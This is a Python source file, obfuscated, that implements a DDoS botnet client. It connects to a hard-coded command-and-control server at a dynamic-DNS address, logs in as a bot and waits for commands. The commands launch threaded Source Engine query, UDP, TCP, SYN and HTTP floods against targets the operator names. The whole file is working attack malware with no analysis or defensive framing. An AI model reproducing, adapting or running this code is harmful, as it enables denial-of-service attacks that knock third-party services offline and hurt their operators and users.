import socket ,threading ,time ,random #line:1
C2_ADDRESS ='kyvetikserver.ddns.net'#line:2
C2_PORT =1337 #line:3
base_user_agents =['Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format (random .uniform (5. ,1e1 )),'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format (random .uniform (5. ,1e1 )),'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f','Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f','Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f']#line:4
def rand_ua ():return random .choice (base_user_agents )%(random .random ()+5 ,random .random ()+random .randint (1 ,8 ),random .random (),random .randint (2000 ,2100 ),random .randint (92215 ,99999 ),random .random ()+random .randint (3 ,9 ),random .random ())#line:5
def attack_vse (O00O00O000OO0O000 ,O0OO0000O0O00O000 ,O00OOOO0O000O000O ):#line:6
	O000OO0OOO0000O00 =b'\xff\xff\xff\xffTSource Engine Query\x00'#line:7
	while time .time ()<O00OOOO0O000O000O :OOOO00O0O00OOOOOO =socket .socket (socket .AF_INET ,socket .SOCK_DGRAM );OOOO00O0O00OOOOOO .sendto (O000OO0OOO0000O00 ,(O00O00O000OO0O000 ,O0OO0000O0O00O000 ))#line:8
def attack_udp (O0O0OO000OOOOOO0O ,O00O0000OOOO0000O ,OOO0OO000000O000O ,O00OO00OO0O00OO00 ):#line:9
	while time .time ()<OOO0OO000000O000O :OOOOOOOOOO0OOOOO0 =socket .socket (socket .AF_INET ,socket .SOCK_DGRAM );O00O0OO0OO0O00O00 =random .randint (1 ,65535 )if O00O0000OOOO0000O ==0 else O00O0000OOOO0000O ;O0OO0O0OO0O000O00 =random ._urandom (O00OO00OO0O00OO00 );OOOOOOOOOO0OOOOO0 .sendto (O0OO0O0OO0O000O00 ,(O0O0OO000OOOOOO0O ,O00O0OO0OO0O00O00 ))#line:10
def attack_tcp (OOO0O0OO0O00O0O00 ,O00OOO0OO000OOOOO ,OO000OO0O0OO0O00O ,OO0000000OOOO0O0O ):#line:11
	while time .time ()<OO000OO0O0OO0O00O :#line:12
		O00OOOOOO0OO00000 =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )#line:13
		try :#line:14
			O00OOOOOO0OO00000 .connect ((OOO0O0OO0O00O0O00 ,O00OOO0OO000OOOOO ))#line:15
			while time .time ()<OO000OO0O0OO0O00O :O00OOOOOO0OO00000 .send (random ._urandom (OO0000000OOOO0O0O ))#line:16
		except :pass #line:17
def attack_syn (O0O0OOO0000OOOOO0 ,OOOOO0OOOOOO0O0O0 ,OOO00OOOOOO00O0O0 ):#line:18
	while time .time ()<OOO00OOOOOO00O0O0 :#line:19
		O0OO0O0OOO000OO00 =socket .socket (socket .AF_INET ,socket .SOCK_STREAM );O0OO0O0OOO000OO00 .setblocking (0 )#line:20
		try :OOOOO00O0OO0OO0OO =random .randint (1 ,65535 )if OOOOO0OOOOOO0O0O0 ==0 else OOOOO0OOOOOO0O0O0 ;O0OO0O0OOO000OO00 .connect ((O0O0OOO0000OOOOO0 ,OOOOO00O0OO0OO0OO ))#line:21
		except :pass #line:22
def attack_http (O00OO0O00O0000000 ,OO000OO000O0O00O0 ):#line:23
	while time .time ()<OO000OO000O0O00O0 :#line:24
		OOO0000O0OO000000 =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )#line:25
		try :#line:26
			OOO0000O0OO000000 .connect ((O00OO0O00O0000000 ,5050 ))#line:27
			while time .time ()<OO000OO000O0O00O0 :OOO0000O0OO000000 .send (f"""GET / HTTP/1.1\r
Host: {O00OO0O00O0000000}\r
User-Agent: {rand_ua()}\r
Connection: keep-alive\r
\r
""".encode ())#line:33
		except :OOO0000O0OO000000 .close ()#line:34
def main ():#line:35
	O0OOO000O00OO0OO0 =True ;O0O0OO0O0OO0OOOOO =socket .socket (socket .AF_INET ,socket .SOCK_STREAM );O0O0OO0O0OO0OOOOO .setsockopt (socket .SOL_SOCKET ,socket .SO_KEEPALIVE ,1 )#line:36
	while 1 :#line:37
		try :#line:38
			O0O0OO0O0OO0OOOOO .connect ((C2_ADDRESS ,C2_PORT ))#line:39
			while 1 :#line:40
				OOO000O0OO0OOO0OO =O0O0OO0O0OO0OOOOO .recv (1024 ).decode ()#line:41
				if 'Username'in OOO000O0OO0OOO0OO :O0O0OO0O0OO0OOOOO .send ('BOT'.encode ());break #line:42
			while 1 :#line:43
				OOO000O0OO0OOO0OO =O0O0OO0O0OO0OOOOO .recv (1024 ).decode ()#line:44
				if 'Password'in OOO000O0OO0OOO0OO :O0O0OO0O0OO0OOOOO .send ('ÿÿÿÿ='.encode ('cp1252'));break #line:45
			break #line:46
		except :time .sleep (120 )#line:47
	while 1 :#line:48
		try :#line:49
			OOO000O0OO0OOO0OO =O0O0OO0O0OO0OOOOO .recv (1024 ).decode ().strip ()#line:50
			if not OOO000O0OO0OOO0OO :break #line:51
			OO0O0O00O0O0O0OO0 =OOO000O0OO0OOO0OO .split (' ');O0O000OOOO00OOOOO =OO0O0O00O0O0O0OO0 [0 ].upper ()#line:52
			if O0O000OOOO00OOOOO =='.VSE':#line:53
				O0OOO0OO0000000OO =OO0O0O00O0O0O0OO0 [1 ];O00O0O0OOOOOOOOOO =int (OO0O0O00O0O0O0OO0 [2 ]);OO0O0OO0OO00O0OOO =time .time ()+int (OO0O0O00O0O0O0OO0 [3 ]);OO00O0O0O00OO00O0 =int (OO0O0O00O0O0O0OO0 [4 ])#line:54
				for O000O0OO0OO00OOOO in range (OO00O0O0O00OO00O0 ):threading .Thread (target =attack_vse ,args =(O0OOO0OO0000000OO ,O00O0O0OOOOOOOOOO ,OO0O0OO0OO00O0OOO ),daemon =O0OOO000O00OO0OO0 ).start ()#line:55
			elif O0O000OOOO00OOOOO =='.UDP':#line:56
				O0OOO0OO0000000OO =OO0O0O00O0O0O0OO0 [1 ];O00O0O0OOOOOOOOOO =int (OO0O0O00O0O0O0OO0 [2 ]);OO0O0OO0OO00O0OOO =time .time ()+int (OO0O0O00O0O0O0OO0 [3 ]);O00O0O0OOO0000OOO =int (OO0O0O00O0O0O0OO0 [4 ]);OO00O0O0O00OO00O0 =int (OO0O0O00O0O0O0OO0 [5 ])#line:57
				for O000O0OO0OO00OOOO in range (OO00O0O0O00OO00O0 ):threading .Thread (target =attack_udp ,args =(O0OOO0OO0000000OO ,O00O0O0OOOOOOOOOO ,OO0O0OO0OO00O0OOO ,O00O0O0OOO0000OOO ),daemon =O0OOO000O00OO0OO0 ).start ()#line:58
			elif O0O000OOOO00OOOOO =='.TCP':#line:59
				O0OOO0OO0000000OO =OO0O0O00O0O0O0OO0 [1 ];O00O0O0OOOOOOOOOO =int (OO0O0O00O0O0O0OO0 [2 ]);OO0O0OO0OO00O0OOO =time .time ()+int (OO0O0O00O0O0O0OO0 [3 ]);O00O0O0OOO0000OOO =int (OO0O0O00O0O0O0OO0 [4 ]);OO00O0O0O00OO00O0 =int (OO0O0O00O0O0O0OO0 [5 ])#line:60
				for O000O0OO0OO00OOOO in range (OO00O0O0O00OO00O0 ):threading .Thread (target =attack_tcp ,args =(O0OOO0OO0000000OO ,O00O0O0OOOOOOOOOO ,OO0O0OO0OO00O0OOO ,O00O0O0OOO0000OOO ),daemon =O0OOO000O00OO0OO0 ).start ()#line:61
			elif O0O000OOOO00OOOOO =='.SYN':#line:62
				O0OOO0OO0000000OO =OO0O0O00O0O0O0OO0 [1 ];O00O0O0OOOOOOOOOO =int (OO0O0O00O0O0O0OO0 [2 ]);OO0O0OO0OO00O0OOO =time .time ()+int (OO0O0O00O0O0O0OO0 [3 ]);OO00O0O0O00OO00O0 =int (OO0O0O00O0O0O0OO0 [4 ])#line:63
				for O000O0OO0OO00OOOO in range (OO00O0O0O00OO00O0 ):threading .Thread (target =attack_syn ,args =(O0OOO0OO0000000OO ,O00O0O0OOOOOOOOOO ,OO0O0OO0OO00O0OOO ),daemon =O0OOO000O00OO0OO0 ).start ()#line:64
			elif O0O000OOOO00OOOOO =='.HTTP':#line:65
				O0OOO0OO0000000OO =OO0O0O00O0O0O0OO0 [1 ];OO0O0OO0OO00O0OOO =time .time ()+int (OO0O0O00O0O0O0OO0 [2 ]);OO00O0O0O00OO00O0 =int (OO0O0O00O0O0O0OO0 [3 ])#line:66
				for O000O0OO0OO00OOOO in range (OO00O0O0O00OO00O0 ):threading .Thread (target =attack_http ,args =(O0OOO0OO0000000OO ,OO0O0OO0OO00O0OOO ),daemon =O0OOO000O00OO0OO0 ).start ()#line:67
			elif O0O000OOOO00OOOOO =='PING':O0O0OO0O0OO0OOOOO .send ('PONG'.encode ())#line:68
		except :break #line:69
	O0O0OO0O0OO0OOOOO .close ();main ()#line:70
if __name__ =='__main__':#line:71
	try :main ()#line:72
	except :pass 